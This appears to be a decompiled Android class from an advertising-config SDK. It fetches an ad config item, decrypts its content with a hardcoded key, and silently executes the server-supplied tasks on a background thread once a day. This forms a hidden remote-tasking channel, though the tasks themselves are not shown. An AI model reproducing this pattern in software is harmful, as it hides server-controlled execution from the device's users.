package us.pinguo.advconfigdata.AdvDex;

import android.content.Context;
import android.text.TextUtils;
import com.google.gson.f;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import us.pinguo.advconfigdata.AdvConfigManager;
import us.pinguo.advconfigdata.Utils.AdvConstants;
import us.pinguo.advconfigdata.Utils.AdvLog;
import us.pinguo.advconfigdata.Utils.AdvPrefUtil;
import us.pinguo.advconfigdata.Utils.AdvTimeUtils;
import us.pinguo.advconfigdata.database.AdvItem;
import us.pinguo.advconfigdata.database.GroupStaticsItem;
/* loaded from: classes3.dex */
public class ExecuteAdvDex {
    public static final String META_KEY = "12345885";
    private static boolean mbExeCuting = false;
    private static boolean mbSuccess = false;
    private final String META_GUID = "b0aeebe1d14b1aa5ad8e41983c4fa8dc";
    private Context mContext;

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: classes3.dex */
    public class a extends Thread {
        a() {
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            ExecuteAdvDex.this.Execute();
            boolean unused = ExecuteAdvDex.mbExeCuting = false;
        }
    }

    public ExecuteAdvDex(Context context) {
        this.mContext = context;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void Execute() {
        List<GroupStaticsItem> list;
        AdvItem item = AdvConfigManager.getInstance().getItem("b0aeebe1d14b1aa5ad8e41983c4fa8dc");
        if (item == null) {
            return;
        }
        String formatData = formatData(AdvTimeUtils.DATE_FORMAT_HYPHEN);
        String string = AdvPrefUtil.getInstance().getString(AdvConstants.KEY_DEX_ADVID);
        String string2 = AdvPrefUtil.getInstance().getString(AdvConstants.KEY_DEX_TIME);
        if (TextUtils.isEmpty(formatData) || TextUtils.isEmpty(item.advId)) {
            return;
        }
        if (item.advId.equals(string) && formatData.equals(string2)) {
            return;
        }
        String str = item.content;
        if (TextUtils.isEmpty(str)) {
            return;
        }
        try {
            String decrypt = EncodeContent.decrypt(META_KEY, str.trim());
            if (TextUtils.isEmpty(decrypt)) {
                return;
            }
            f fVar = new f();
            fVar.c();
            DexJsonData dexJsonData = (DexJsonData) fVar.b().j(decrypt, DexJsonData.class);
            if (dexJsonData != null && (list = dexJsonData.data) != null && list.size() > 0) {
                DexFunction dexFunction = new DexFunction(this.mContext);
                for (int i2 = 0; i2 < list.size(); i2++) {
                    dexFunction.ExeCuteTask(list.get(i2));
                }
                dexFunction.Finish();
                AdvPrefUtil.getInstance().putString(AdvConstants.KEY_DEX_TIME, formatData(AdvTimeUtils.DATE_FORMAT_HYPHEN));
                AdvPrefUtil.getInstance().putString(AdvConstants.KEY_DEX_ADVID, item.advId);
                mbSuccess = true;
            }
        } catch (Exception e2) {
            new DexFunction(this.mContext).ReportError(e2.getMessage());
            AdvLog.Log(e2.getMessage());
        }
    }

    public void StartThread() {
        if (mbExeCuting || mbSuccess) {
            return;
        }
        mbExeCuting = true;
        new a().start();
    }

    public String formatData(String str) {
        return new SimpleDateFormat(str).format(new Date(System.currentTimeMillis()));
    }
}
